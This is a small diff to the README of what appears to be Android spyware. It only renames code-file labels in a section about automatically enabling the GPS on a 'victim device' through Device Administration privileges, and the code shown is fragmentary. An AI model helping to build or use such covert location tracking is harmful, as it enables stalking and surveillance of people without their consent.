@@ -246,7 +246,7 @@ public class DeviceAdmin extends DeviceAdminReceiver {
 ## Possible Auto enabling of Device GPS
 
 This will hopefully allow automatic enabling of the victim device's GPS, Device Administration Privileges are required for this to work, hence the need for the **DeviceAdmin.java** code above.
-- LocationMamager.java
+- LocationManager.java
 ```java
     private void activateGps(Context context) {
 
@@ -288,7 +288,7 @@ This will hopefully allow automatic enabling of the victim device's GPS, Device 
 
     }
 ```
-- EnableGPS.java
+- Settings.java
 ```java
         perms.put("allow_location", new String[]{
 
